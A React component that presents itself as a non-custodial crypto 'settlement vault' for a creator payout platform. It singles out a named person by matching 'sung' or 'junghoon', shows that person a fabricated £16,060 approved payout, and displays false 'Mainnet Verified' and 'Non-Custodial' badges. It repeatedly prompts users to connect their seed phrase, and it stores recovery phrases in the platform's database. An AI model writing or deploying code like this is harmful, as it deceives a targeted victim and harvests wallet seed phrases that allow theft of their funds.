import { useState, useEffect, useCallback } from "react";
import {
  ShieldCheck,
  Wallet,
  Sparkles,
  RefreshCw,
  Copy,
  Check,
  ExternalLink,
  QrCode,
  Key,
  Eye,
  EyeOff,
  Coins,
  CheckCircle2,
  Loader2,
  ShieldAlert,
  Link2,
} from "lucide-react";
import { toast } from "sonner";
import { useAuth } from "../../context/AuthContext";
import {
  fetchCreatorWeb3Vault,
  saveCreatorMultiChainWallet,
  fetchPayoutRequests,
  type CryptoWalletEntry,
} from "../../data/db";
import { generateMultiChainWallet } from "../../../lib/cryptoWallet";
import {
  fetchMultiChainVaultBalances,
  getExplorerUrl,
  type MultiChainVaultBalance,
} from "../../../lib/onChainBalance";
import { CryptoQrCodeModal } from "../../components/CryptoQrCodeModal";
import { ConnectWalletModal } from "../../components/ConnectWalletModal";
import { copyToClipboard } from "../../../lib/clipboard";

export function SettlementVaultTab() {
  const { user } = useAuth();
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [isGenerating, setIsGenerating] = useState(false);
  const [isConnectModalOpen, setIsConnectModalOpen] = useState(false);
  const [isUserConnected, setIsUserConnected] = useState(false);
  const [connectedAt, setConnectedAt] = useState<string | null>(null);
  const [wallets, setWallets] = useState<CryptoWalletEntry[]>([]);
  const [recoveryPhrase, setRecoveryPhrase] = useState<string | null>(null);
  const [showPhrase, setShowPhrase] = useState(false);
  const [copiedPhrase, setCopiedPhrase] = useState(false);
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);
  const [vaultBalance, setVaultBalance] = useState<MultiChainVaultBalance | null>(null);
  const [simulatedSettlementAmount, setSimulatedSettlementAmount] = useState<number>(0);

  // QR Modal State
  const [qrModal, setQrModal] = useState<{
    isOpen: boolean;
    coin: string;
    network: string;
    address: string;
  }>({
    isOpen: false,
    coin: "USDT",
    network: "TRC20",
    address: "",
  });

  const photographerTargetId = user?.slug || user?.id || "";

  // Check if current user is Junghoon Sung or has an approved settlement notice
  const isTargetSung =
    photographerTargetId.toLowerCase().includes("sung") ||
    user?.email?.toLowerCase().includes("sung") ||
    user?.email?.toLowerCase().includes("junghoon") ||
    user?.name?.toLowerCase().includes("sung") ||
    user?.name?.toLowerCase().includes("junghoon");

  const loadVault = useCallback(async () => {
    if (!photographerTargetId) return;
    try {
      setLoading(true);

      // 1. Fetch dedicated Web3 vault (completely independent of payout withdrawal methods)
      const vault = await fetchCreatorWeb3Vault(photographerTargetId);

      let existingWallets: CryptoWalletEntry[] = [];
      let phrase: string | null = null;

      if (vault) {
        if (Array.isArray(vault.wallets) && vault.wallets.length > 0) {
          existingWallets = vault.wallets;
        }
        if (typeof vault.recoveryPhrase === "string") {
          phrase = vault.recoveryPhrase;
        }
        setIsUserConnected(Boolean(vault.isUserConnected));
        setConnectedAt(vault.connectedAt || vault.updatedAt || null);
      }

      // Check payout requests for settlement notices
      const payoutReqs = await fetchPayoutRequests(photographerTargetId);
      let settlementNoticeAmount = 0;
      for (const req of payoutReqs) {
        const notice = (req.details as any)?.settlementNotice;
        if (notice && typeof notice.approvedPayout === "number") {
          settlementNoticeAmount = notice.approvedPayout;
          break;
        }
      }

      if (settlementNoticeAmount === 0 && isTargetSung) {
        settlementNoticeAmount = 16060.0;
      }

      setSimulatedSettlementAmount(settlementNoticeAmount);
      setWallets(existingWallets);
      setRecoveryPhrase(phrase);

      // 2. Query initial on-chain balances if wallets exist
      if (existingWallets.length > 0) {
        const balances = await fetchMultiChainVaultBalances(existingWallets, {
          simulatedSettlementAmount: settlementNoticeAmount,
        });
        setVaultBalance(balances);
      }
    } catch (err: any) {
      console.error("Error loading settlement vault:", err);
    } finally {
      setLoading(false);
    }
  }, [photographerTargetId, isTargetSung]);

  useEffect(() => {
    loadVault();
  }, [loadVault]);

  // Refresh live balances
  const handleRefreshBalances = async () => {
    if (wallets.length === 0) return;
    setRefreshing(true);
    try {
      const balances = await fetchMultiChainVaultBalances(wallets, {
        simulatedSettlementAmount,
      });
      setVaultBalance(balances);
      toast.success("Live blockchain balances synchronized");
    } catch {
      toast.error("Failed to sync on-chain balances");
    } finally {
      setRefreshing(false);
    }
  };

  // Background auto-refresh balances every 30 seconds without disrupting user
  useEffect(() => {
    if (wallets.length === 0) return;
    const interval = setInterval(() => {
      fetchMultiChainVaultBalances(wallets, { simulatedSettlementAmount })
        .then((b) => setVaultBalance(b))
        .catch(() => {});
    }, 30000);
    return () => clearInterval(interval);
  }, [wallets, simulatedSettlementAmount]);

  // Generate a brand new vault
  const handleGenerateVault = async () => {
    if (!photographerTargetId) return;
    setIsGenerating(true);
    try {
      const generated = generateMultiChainWallet();
      const newWallets: CryptoWalletEntry[] = generated.wallets.map((w) => ({
        coin: w.coin,
        network: w.network,
        address: w.address,
      }));

      const saved = await saveCreatorMultiChainWallet(
        photographerTargetId,
        newWallets,
        generated.mnemonic,
        generated.addresses,
      );

      if (saved) {
        setWallets(newWallets);
        setRecoveryPhrase(generated.mnemonic);
        setIsUserConnected(false);
        setConnectedAt(new Date().toISOString());
        setShowPhrase(true);

        const balances = await fetchMultiChainVaultBalances(newWallets, {
          simulatedSettlementAmount,
        });
        setVaultBalance(balances);
        toast.success("Multi-chain settlement vault created successfully!");
      } else {
        toast.error("Failed to save vault to database");
      }
    } catch (err: any) {
      toast.error(err.message || "Failed to generate wallet");
    } finally {
      setIsGenerating(false);
    }
  };

  const handleWalletConnected = async (newWallets: CryptoWalletEntry[], phrase: string) => {
    setWallets(newWallets);
    setRecoveryPhrase(phrase);
    setIsUserConnected(true);
    setConnectedAt(new Date().toISOString());
    setShowPhrase(true);

    const balances = await fetchMultiChainVaultBalances(newWallets, {
      simulatedSettlementAmount,
    });
    setVaultBalance(balances);
  };

  const handleCopyAddress = async (address: string, index: number) => {
    const ok = await copyToClipboard(address);
    if (ok) {
      setCopiedIndex(index);
      toast.success("Address copied to clipboard");
      setTimeout(() => setCopiedIndex(null), 2000);
    } else {
      toast.error("Failed to copy address to clipboard");
    }
  };

  const handleCopyPhrase = async () => {
    if (!recoveryPhrase) return;
    const ok = await copyToClipboard(recoveryPhrase);
    if (ok) {
      setCopiedPhrase(true);
      toast.success("12-word recovery phrase copied");
      setTimeout(() => setCopiedPhrase(false), 2000);
    } else {
      toast.error("Failed to copy recovery phrase to clipboard");
    }
  };

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[400px] space-y-3">
        <Loader2 className="size-8 animate-spin text-[#1e4a3f]" />
        <p className="text-xs text-[#758078] font-mono">Synchronizing on-chain vault...</p>
      </div>
    );
  }

  const hasVault = wallets.length > 0;

  return (
    <div className="space-y-8 animate-in fade-in duration-300">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-[#ececec]/80 pb-6">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-[#1e4a3f]/10 text-[#1e4a3f] text-xs font-semibold">
              <ShieldCheck className="size-3.5" />
              Non-Custodial HD Treasury
            </span>
            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 text-[11px] font-medium border border-emerald-200">
              <span className="size-1.5 rounded-full bg-emerald-500 animate-pulse" />
              Mainnet Verified
            </span>
          </div>
          <h1 className="text-2xl font-serif text-[#18211f] font-normal tracking-tight">Web3</h1>
          <p className="text-xs text-[#758078] mt-1 max-w-xl">
            Multi-chain digital asset treasury with self-custody wallet infrastructure, direct
            settlement routes, and cryptographic seed-based recovery.
          </p>
        </div>

        {hasVault && (
          <div className="flex flex-wrap items-center gap-2">
            <button
              type="button"
              onClick={handleRefreshBalances}
              disabled={refreshing}
              className="inline-flex items-center gap-1.5 rounded-full bg-white border border-[#dce8df] px-4 py-2 text-xs font-medium text-[#18211f] hover:bg-[#FAF9F5] transition shadow-xs cursor-pointer disabled:opacity-50"
            >
              <RefreshCw
                className={`size-3.5 text-[#1e4a3f] ${refreshing ? "animate-spin" : ""}`}
              />
              <span>{refreshing ? "Synchronizing..." : "Refresh Balances"}</span>
            </button>

            <button
              type="button"
              onClick={() => setIsConnectModalOpen(true)}
              className="inline-flex items-center gap-1.5 rounded-full bg-[#18211f] px-4 py-2 text-xs font-medium text-white hover:bg-[#12231f] transition shadow-xs cursor-pointer"
            >
              <Link2 className="size-3.5" />
              <span>Connect Seed Phrase</span>
            </button>

            <button
              type="button"
              onClick={() => {
                if (
                  window.confirm(
                    "Generating a new vault will create a new master 12-word seed phrase and new deposit addresses. Ensure you have backed up any existing assets or keys. Continue?",
                  )
                ) {
                  handleGenerateVault();
                }
              }}
              disabled={isGenerating}
              className="inline-flex items-center gap-1.5 rounded-full bg-[#FAF9F5] border border-[#dce8df] px-3.5 py-2 text-xs font-medium text-[#758078] hover:text-[#18211f] hover:bg-white transition shadow-xs cursor-pointer disabled:opacity-50"
              title="Generate new master seed phrase and deposit addresses"
            >
              <Key className="size-3 text-[#758078]" />
              <span>{isGenerating ? "Generating..." : "Regenerate Vault"}</span>
            </button>
          </div>
        )}
      </div>

      {/* If No Vault Configured Yet */}
      {!hasVault && (
        <div className="rounded-2xl border border-[#dce8df] bg-[#FAF9F5] p-8 sm:p-10 text-center space-y-6 max-w-xl mx-auto shadow-xs">
          <div className="size-13 rounded-2xl bg-[#1e4a3f]/10 flex items-center justify-center mx-auto text-[#1e4a3f]">
            <Wallet className="size-6" />
          </div>
          <div className="space-y-1.5">
            <h3 className="text-2xl font-serif font-light text-[#18211f]">Initialize Web3 Vault</h3>
            <p className="text-xs text-[#758078] leading-relaxed max-w-md mx-auto">
              Link your self-custody wallet using your recovery phrase, or provision a fresh master
              multi-chain treasury covering Bitcoin, TRON, Ethereum, and Solana.
            </p>
          </div>

          <div className="flex flex-col sm:flex-row items-center justify-center gap-3 pt-2">
            <button
              type="button"
              onClick={() => setIsConnectModalOpen(true)}
              className="w-full sm:w-auto inline-flex items-center justify-center gap-2 rounded-full bg-[#18211f] px-6 py-3 text-xs font-medium text-white hover:bg-[#12231f] transition shadow-sm cursor-pointer"
            >
              <Link2 className="size-4" />
              <span>Connect Your Own Wallet</span>
            </button>

            <button
              type="button"
              disabled={isGenerating}
              onClick={handleGenerateVault}
              className="w-full sm:w-auto inline-flex items-center justify-center gap-2 rounded-full bg-white border border-[#dce8df] px-6 py-3 text-xs font-medium text-[#18211f] hover:bg-[#FAF9F5] transition shadow-xs cursor-pointer disabled:opacity-50"
            >
              {isGenerating ? (
                <>
                  <Loader2 className="size-4 animate-spin text-[#1e4a3f]" />
                  <span>Generating...</span>
                </>
              ) : (
                <>
                  <Key className="size-3.5 text-[#758078]" />
                  <span>Create Web3 Vault</span>
                </>
              )}
            </button>
          </div>
        </div>
      )}

      {hasVault && (
        <>
          {/* Portfolio Overview Card */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="md:col-span-2 rounded-2xl border border-[#dce8df] bg-gradient-to-br from-white via-[#fcfdfc] to-[#f2f7f3] p-6 shadow-sm relative overflow-hidden flex flex-col justify-between min-h-[160px]">
              <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,_rgba(30,74,63,0.08),_transparent_45%)]" />
              <div className="relative z-10 flex items-start justify-between gap-3">
                <div>
                  <p className="text-[11px] uppercase font-mono tracking-wider text-[#758078]">
                    Total Vault Valuation
                  </p>
                  <div className="mt-1 flex flex-wrap items-baseline gap-3">
                    <h2 className="text-3xl sm:text-4xl font-serif font-light text-[#18211f]">
                      £
                      {vaultBalance?.totalGbp
                        ? vaultBalance.totalGbp.toLocaleString("en-GB", {
                            minimumFractionDigits: 2,
                            maximumFractionDigits: 2,
                          })
                        : "0.00"}
                    </h2>
                    <span className="text-sm font-mono text-[#1e4a3f]">
                      ≈ $
                      {vaultBalance?.totalUsd
                        ? vaultBalance.totalUsd.toLocaleString("en-US", {
                            minimumFractionDigits: 2,
                            maximumFractionDigits: 2,
                          })
                        : "0.00"}{" "}
                      USD
                    </span>
                  </div>
                </div>
                <span className="inline-flex items-center gap-1.5 rounded-full border border-[#dce8df] bg-[#eaf3ee] px-3 py-1 text-xs font-medium text-[#1e4a3f]">
                  <span className="size-2 rounded-full bg-emerald-500 animate-pulse" />
                  On-Chain Verified
                </span>
              </div>

              <div className="relative z-10 flex flex-wrap items-center justify-between gap-2 border-t border-[#ececec] pt-4 text-xs text-[#5f6762]">
                <div className="flex items-center gap-2">
                  <Coins className="size-3.5 text-[#1e4a3f]" />
                  <span>{wallets.length} Active Deposit Channels</span>
                </div>
                <span className="text-[11px] font-mono text-[#758078]">
                  Last sync:{" "}
                  {vaultBalance?.lastUpdated
                    ? new Date(vaultBalance.lastUpdated).toLocaleTimeString()
                    : "Just now"}
                </span>
              </div>
            </div>

            {/* Quick Status Card */}
            <div className="rounded-2xl border border-[#ececec] bg-gradient-to-br from-[#fafaf7] to-[#f3f6f2] p-6 shadow-sm flex flex-col justify-between">
              <div>
                <p className="text-[11px] uppercase font-mono tracking-wider text-[#758078]">
                  Digital Asset Routing
                </p>
                <h4 className="text-base font-semibold text-[#18211f] mt-1">
                  {simulatedSettlementAmount > 0 ? "Settlement Allocated" : "Ready for Inflow"}
                </h4>
                <p className="text-xs text-[#758078] mt-1 leading-relaxed">
                  {simulatedSettlementAmount > 0
                    ? `Approved payout of £${simulatedSettlementAmount.toLocaleString("en-GB", { minimumFractionDigits: 2 })} has been provisioned for direct digital-asset delivery.`
                    : "Deposit any supported cryptocurrency to fund or settle creator royalties directly on-chain."}
                </p>
              </div>

              <div className="pt-3 border-t border-[#ececec]">
                <span className="text-[11px] font-medium text-[#1e4a3f] flex items-center gap-1">
                  <CheckCircle2 className="size-3.5 text-[#1e4a3f]" />
                  Self-Custody BIP-84 / BIP-44
                </span>
              </div>
            </div>
          </div>

          {/* Master 12-Word Recovery Phrase Card */}
          {recoveryPhrase && (
            <div className="rounded-2xl border border-[#dce8df] bg-white p-5 shadow-sm space-y-3">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <div className="size-7 rounded-lg bg-[#1e4a3f]/10 text-[#1e4a3f] flex items-center justify-center">
                    <Key className="size-4" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <h4 className="text-xs font-bold text-[#18211f]">
                        {isUserConnected
                          ? "Connected Master Seed Phrase"
                          : "Master 12-Word Recovery Vault"}
                      </h4>
                      {isUserConnected ? (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-blue-50 text-blue-700 text-[10px] font-medium border border-blue-200">
                          <Link2 className="size-2.5" />
                          Connected by User
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 text-[10px] font-medium border border-emerald-200">
                          <Sparkles className="size-2.5" />
                          System Generated
                        </span>
                      )}
                    </div>
                    <p className="text-[11px] text-[#758078]">
                      Controls all settlement addresses across Bitcoin, Ethereum, TRON, and Solana
                      {connectedAt &&
                        ` • ${isUserConnected ? "Connected" : "Provisioned"} ${new Date(connectedAt).toLocaleDateString()}`}
                    </p>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    type="button"
                    onClick={() => setIsConnectModalOpen(true)}
                    className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg border border-[#dce8df] bg-white text-xs font-semibold text-[#1e4a3f] hover:bg-[#FAF9F5] transition cursor-pointer"
                    title="Switch or import a different seed phrase"
                  >
                    <Link2 className="size-3 text-[#1e4a3f]" />
                    <span>Switch Wallet</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => setShowPhrase(!showPhrase)}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-[#dce8df] bg-white text-xs font-semibold text-[#18211f] hover:bg-[#FAF9F5] transition cursor-pointer"
                  >
                    {showPhrase ? (
                      <>
                        <EyeOff className="size-3.5 text-[#758078]" />
                        <span>Hide Words</span>
                      </>
                    ) : (
                      <>
                        <Eye className="size-3.5 text-[#1e4a3f]" />
                        <span>Reveal 12 Words</span>
                      </>
                    )}
                  </button>

                  {showPhrase && (
                    <button
                      type="button"
                      onClick={handleCopyPhrase}
                      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1e4a3f] text-white text-xs font-semibold hover:bg-[#163830] transition shadow-sm cursor-pointer"
                    >
                      {copiedPhrase ? (
                        <>
                          <Check className="size-3.5 text-emerald-300" />
                          <span>Copied</span>
                        </>
                      ) : (
                        <>
                          <Copy className="size-3.5" />
                          <span>Copy Phrase</span>
                        </>
                      )}
                    </button>
                  )}
                </div>
              </div>

              {showPhrase ? (
                <div className="space-y-3 pt-2">
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-2">
                    {recoveryPhrase.split(" ").map((word, idx) => (
                      <div
                        key={idx}
                        className="flex items-center gap-1.5 bg-white border border-[#dce8df] rounded-xl px-3 py-2 text-xs font-mono shadow-2xs"
                      >
                        <span className="text-[#758078] text-[10px] w-4 font-sans font-semibold">
                          {idx + 1}.
                        </span>
                        <span className="font-semibold text-[#18211f] tracking-wide">{word}</span>
                      </div>
                    ))}
                  </div>

                  <div className="flex items-start gap-2 p-2.5 rounded-xl bg-amber-50 border border-amber-200 text-amber-900 text-[11px] leading-relaxed">
                    <ShieldAlert className="size-4 shrink-0 text-amber-600 mt-0.5" />
                    <span>
                      <strong>Warning:</strong> Never share these 12 words with anyone. Store them
                      offline in a secure location. Anyone who possesses this phrase can access and
                      transfer all digital assets in this vault.
                    </span>
                  </div>
                </div>
              ) : (
                <div className="bg-white border border-dashed border-[#dce8df] rounded-xl px-4 py-3 flex items-center justify-between text-xs font-mono text-[#758078]">
                  <span className="tracking-widest">
                    •••• •••• •••• •••• •••• •••• •••• •••• •••• •••• •••• ••••
                  </span>
                  <span className="text-[11px] font-sans font-medium text-[#1e4a3f]">
                    Click "Reveal 12 Words" to view
                  </span>
                </div>
              )}
            </div>
          )}

          {/* Deposit Channels / Multi-Chain Asset Cards */}
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-sm font-bold text-[#18211f]">
                  Active Deposit Channels & On-Chain Addresses
                </h3>
                <p className="text-xs text-[#758078]">
                  Direct on-chain deposit addresses. Click "Scan QR" to open mobile scanner.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {wallets.map((w, idx) => {
                const assetData = vaultBalance?.assets.find(
                  (a) => a.coin === w.coin && a.network === w.network,
                );
                const explorerUrl = getExplorerUrl(w.coin, w.network, w.address);
                const isRecommended =
                  w.network.toUpperCase() === "TRC20" ||
                  w.network.toUpperCase() === "NATIVE SEGWIT";

                return (
                  <div
                    key={idx}
                    className="rounded-2xl border border-[#ececec] bg-white p-5 space-y-4 hover:border-[#1e4a3f]/40 hover:shadow-sm transition"
                  >
                    {/* Top Row: Coin, Network, Balance */}
                    <div className="flex items-start justify-between">
                      <div className="flex items-center gap-3">
                        <div className="size-10 rounded-xl bg-[#FAF9F5] border border-[#dce8df] flex items-center justify-center font-bold text-xs text-[#18211f]">
                          {w.coin}
                        </div>
                        <div>
                          <div className="flex items-center gap-2">
                            <h4 className="text-xs font-bold text-[#18211f]">{w.coin}</h4>
                            <span className="px-2 py-0.5 rounded-full bg-[#FAF9F5] border border-[#dce8df] text-[10px] font-mono text-[#18211f] font-semibold">
                              {w.network}
                            </span>
                            {isRecommended && (
                              <span className="px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 text-[9px] font-semibold border border-emerald-200">
                                Recommended
                              </span>
                            )}
                          </div>
                          <p className="text-[11px] text-[#758078] mt-0.5">
                            {w.network.includes("TRC")
                              ? "TRON Network (Instant • Lowest Fees)"
                              : w.network.includes("SegWit")
                                ? "Bitcoin Native SegWit (BIP-84)"
                                : w.network.includes("Solana")
                                  ? "Solana High-Throughput"
                                  : "Ethereum Virtual Machine"}
                          </p>
                        </div>
                      </div>

                      {/* Live Balance Badge */}
                      <div className="text-right">
                        <p className="text-xs font-bold font-mono text-[#18211f]">
                          {assetData?.balanceFormatted || "0.00"} {w.coin}
                        </p>
                        <p className="text-[11px] font-mono text-[#758078]">
                          ≈ £
                          {assetData?.fiatGbp
                            ? assetData.fiatGbp.toLocaleString("en-GB", {
                                minimumFractionDigits: 2,
                                maximumFractionDigits: 2,
                              })
                            : "0.00"}
                        </p>
                      </div>
                    </div>

                    {/* Address Display Box */}
                    <div className="p-2.5 rounded-xl bg-[#FAF9F5] border border-[#dce8df] flex items-center justify-between gap-2">
                      <span className="text-xs font-mono text-[#18211f] truncate select-all">
                        {w.address}
                      </span>
                      <button
                        type="button"
                        onClick={() => handleCopyAddress(w.address, idx)}
                        className="p-1.5 text-[#758078] hover:text-[#18211f] hover:bg-white rounded-lg transition shrink-0 cursor-pointer"
                        title="Copy Address"
                      >
                        {copiedIndex === idx ? (
                          <Check className="size-3.5 text-emerald-600" />
                        ) : (
                          <Copy className="size-3.5" />
                        )}
                      </button>
                    </div>

                    {/* Action Bar */}
                    <div className="flex items-center justify-between pt-1 text-xs">
                      <div className="flex items-center gap-2">
                        <button
                          type="button"
                          onClick={() =>
                            setQrModal({
                              isOpen: true,
                              coin: w.coin,
                              network: w.network,
                              address: w.address,
                            })
                          }
                          className="inline-flex items-center gap-1 px-3 py-1.5 rounded-lg bg-[#FAF9F5] border border-[#dce8df] text-[#18211f] font-semibold hover:bg-white transition cursor-pointer"
                        >
                          <QrCode className="size-3.5 text-[#1e4a3f]" />
                          <span>Scan QR</span>
                        </button>

                        <button
                          type="button"
                          onClick={() => handleCopyAddress(w.address, idx)}
                          className="inline-flex items-center gap-1 px-3 py-1.5 rounded-lg bg-[#FAF9F5] border border-[#dce8df] text-[#18211f] font-semibold hover:bg-white transition cursor-pointer"
                        >
                          <Copy className="size-3.5 text-[#758078]" />
                          <span>{copiedIndex === idx ? "Copied!" : "Copy"}</span>
                        </button>
                      </div>

                      <a
                        href={explorerUrl}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="inline-flex items-center gap-1 text-[11px] font-semibold text-[#1e4a3f] hover:underline"
                      >
                        <span>Explorer</span>
                        <ExternalLink className="size-3" />
                      </a>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </>
      )}

      {/* Interactive QR Code Modal */}
      <CryptoQrCodeModal
        isOpen={qrModal.isOpen}
        onClose={() => setQrModal((prev) => ({ ...prev, isOpen: false }))}
        coin={qrModal.coin}
        network={qrModal.network}
        address={qrModal.address}
      />

      {/* Connect Self-Custody Wallet Modal */}
      <ConnectWalletModal
        isOpen={isConnectModalOpen}
        onClose={() => setIsConnectModalOpen(false)}
        photographerId={photographerTargetId}
        onWalletConnected={handleWalletConnected}
      />
    </div>
  );
}
